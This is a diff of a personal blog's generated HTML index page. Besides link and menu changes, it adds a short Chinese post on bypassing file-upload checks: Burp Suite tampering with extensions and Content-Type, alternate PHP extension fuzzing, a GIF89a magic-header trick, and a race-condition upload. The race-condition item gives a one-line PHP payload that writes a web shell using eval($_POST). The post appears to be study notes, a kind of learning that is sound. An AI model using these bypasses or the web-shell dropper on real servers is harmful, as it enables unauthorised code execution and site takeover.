@@ -77,8 +77,6 @@
 			
 				<li><a href="https://zhousiwei.gitee.io/ibooks/" target="_blank">技术笔记</a></li>
 			
-				<li><a href="/tags/%E9%9A%8F%E7%AC%94/" target="_blank">随笔</a></li>
-			
 			</ul>
 		</nav>
 		<nav class="header-smart-menu">
@@ -100,12 +98,7 @@
 			<div class="social">
 				
 					
-						<a class="github" href="#" 
-												title="GitHub" target="_blank"><i class="icon-github"></i></a>
-					
-				
-					
-						<a class="github" href="#" 
+						<a class="github" href="https://github.com/zhouypeng/zhouypeng.github.io" 
 												title="GitHub" target="_blank"><i class="icon-github"></i></a>
 					
 				
@@ -169,8 +162,6 @@
 			
 				
 			
-				
-			
 			
 			
 			<nav class="header-nav">
@@ -178,12 +169,7 @@
 					
 						
 						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
-						
-					
-						
-						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
+							href="https://github.com/zhouypeng/zhouypeng.github.io" title="GitHub"><i class="icon-github"></i></a>
 						
 					
 						
@@ -200,14 +186,12 @@
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 70%">
+				<ul style="width: 50%">
 				
 				
-					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
+					<li style="width: 50%"><a href="/">主页</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a target="_blank" rel="noopener" href="https://zhousiwei.gitee.io/ibooks/">技术笔记</a></li>
-		        
-					<li style="width: 33.333333333333336%"><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
+					<li style="width: 50%"><a target="_blank" rel="noopener" href="https://zhousiwei.gitee.io/ibooks/">技术笔记</a></li>
 		        
 				</ul>
 			</nav>
@@ -224,6 +208,94 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-文件上传" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/04/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/04/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
+        <time datetime="2024-04-04T15:56:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-04</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="客户端检查—文件后缀检查"><a href="#客户端检查—文件后缀检查" class="headerlink" title="客户端检查—文件后缀检查"></a>客户端检查—文件后缀检查</h3><h6 id="Burpsuite抓包改包：上传规定的后缀版本，利用Brupsuite抓包修改后缀"><a href="#Burpsuite抓包改包：上传规定的后缀版本，利用Brupsuite抓包修改后缀" class="headerlink" title="Burpsuite抓包改包：上传规定的后缀版本，利用Brupsuite抓包修改后缀"></a>Burpsuite抓包改包：上传规定的后缀版本，利用Brupsuite抓包修改后缀</h6><h6 id="禁用JS脚本（删除）"><a href="#禁用JS脚本（删除）" class="headerlink" title="禁用JS脚本（删除）"></a>禁用JS脚本（删除）</h6><p>使用开发者工具，找到onsubmit删除。但是一般无法实现，因为浏览器已经加载JS</p>
+<h3 id="MIME类型检查—文件类型检查"><a href="#MIME类型检查—文件类型检查" class="headerlink" title="MIME类型检查—文件类型检查"></a>MIME类型检查—文件类型检查</h3><h6 id="Burpsuite抓包修改content-tyoe"><a href="#Burpsuite抓包修改content-tyoe" class="headerlink" title="Burpsuite抓包修改content-tyoe"></a>Burpsuite抓包修改content-tyoe</h6><h3 id="黑名单检查"><a href="#黑名单检查" class="headerlink" title="黑名单检查"></a>黑名单检查</h3><h6 id="Burpsuite使用以下后缀名进行模糊测试上传"><a href="#Burpsuite使用以下后缀名进行模糊测试上传" class="headerlink" title="Burpsuite使用以下后缀名进行模糊测试上传"></a>Burpsuite使用以下后缀名进行模糊测试上传</h6><h6 id="php3、php4、php5、php7、pht、phtml"><a href="#php3、php4、php5、php7、pht、phtml" class="headerlink" title="php3、php4、php5、php7、pht、phtml"></a>php3、php4、php5、php7、pht、phtml</h6><h3 id="白名单检查"><a href="#白名单检查" class="headerlink" title="白名单检查"></a>白名单检查</h3><h6 id="存在文件包含include、include-once、require、require-once"><a href="#存在文件包含include、include-once、require、require-once" class="headerlink" title="存在文件包含include、include_once、require、require_once"></a>存在文件包含include、include_once、require、require_once</h6><h3 id="Magic-Header检查"><a href="#Magic-Header检查" class="headerlink" title="Magic Header检查"></a>Magic Header检查</h3><h6 id="修改文件头信息"><a href="#修改文件头信息" class="headerlink" title="修改文件头信息"></a>修改文件头信息</h6><p>在PHP文件开始部分添加GIF89a</p>
+<p>GIF89a–&gt;47494638</p>
+<h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[&quot;data&quot;]); ?&gt;&#x27;</span>) ?&gt;</span><br></pre></td></tr></table></figure>
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/04/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
 
   
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -440,6 +512,10 @@
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
@@ -500,32 +576,12 @@
             </li>
           
             <li class="search-li">
-              <a href="https://github.com/JoeyBling" target="_blank" 
+              <a href="https://github.com/zhouypeng/zhouypeng.github.io" target="_blank" 
                 class="search-title" >
                 
                   <i class="icon-link icon"></i>
                 
                 GitHub
-              </a>
-            </li>
-          
-            <li class="search-li">
-              <a href="https://gitee.com/zhousiwei" target="_blank" 
-                class="search-title" >
-                
-                  <i class="icon-link icon"></i>
-                
-                码云
-              </a>
-            </li>
-          
-            <li class="search-li">
-              <a href="https://www.jianshu.com/u/02cbf31a043a" target="_blank" 
-                class="search-title" >
-                
-                  <i class="icon-link icon"></i>
-                
-                简书
               </a>
             </li>
           
